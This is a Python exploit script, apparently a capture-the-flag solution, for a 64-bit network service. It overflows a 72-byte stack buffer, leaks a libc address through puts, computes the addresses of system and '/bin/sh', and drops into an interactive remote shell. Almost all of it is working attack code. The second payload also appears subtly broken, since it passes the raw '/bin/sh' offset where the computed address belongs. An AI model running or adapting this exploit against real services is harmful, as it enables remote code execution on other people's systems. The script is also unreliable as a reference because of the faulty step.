# -*- coding: utf-8 -*-
#!/usr/bin/env python

from socket import *
from telnetlib import Telnet
from time import time, sleep
from sys import argv
from struct import pack, unpack

def read_until(s, c):
    ret = ""
    while 1:
        ret += s.recv(1)
        if ret.endswith(c):
            return ret        
        
def p(x):
    return pack("<Q", x)

def u(x):
    return unpack("<Q", x)[0]

def interact(s):
    print("[*] connect to remote")
    t = Telnet()
    t.sock = s
    t.interact()

if len(argv) >= 2 and argv[1] == "r":
    print("[*] connetc to remote")
    HOST = argv[2]
    PORT = int(argv[3])

else:
    print("[*] connect to local")
    HOST = "localhost"
    PORT = 4000


gets_plt = 0x400560
gets_got = 0x601038
puts_plt = 0x400520
puts_got = 0x601018
puts_rel = 0x809c0
#puts_rel = 0x6f690

main_addr = 0x4006a9

libc_start_main_plt = 0x400550
libc_start_main_got = 0x601030
libc_start_main = 0x21ab0

popret = 0x400753
system_rel = 0x4f440
#system_rel = 0x45390
binsh_rel = 0x1b3e9a
#binsh_rel = 0x18cd57


def main():
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((HOST, PORT))

    _ = read_until(s, "Local Buffer >> ")

    
    payload = "A" * 72
    payload += p(popret)
    payload += p(libc_start_main_got)
    payload += p(puts_plt)
    payload += p(main_addr)

    s.sendall(payload + "\n")

    _ = read_until(s, "Have a nice pwn!!\n")

    libc_main_addr = hex(u(read_until(s, "\n") + "A"))

    print(libc_main_addr)

    tmp = libc_main_addr[0:2]
    libc_main_addr = libc_main_addr[-12:]
    libc_main_addr = int(tmp + libc_main_addr, 16)
    print(libc_main_addr)
    libc_addr = libc_main_addr - libc_start_main
    system_addr = libc_addr + system_rel
    print(hex(system_addr))
    binsh_addr = libc_addr + binsh_rel

    _ = read_until(s, "Local Buffer >> ")
    
    payload = "A" * 72
    payload += p(popret)
    payload += p(binsh_rel)
    payload += p(system_addr)
    payload += "AAAAAAAA"


    s.sendall(payload + "\n")
    _ = read_until(s, "Have a nice pwn!!\n")

    interact(s)
    
    
if __name__ == "__main__":
    main()
    
        

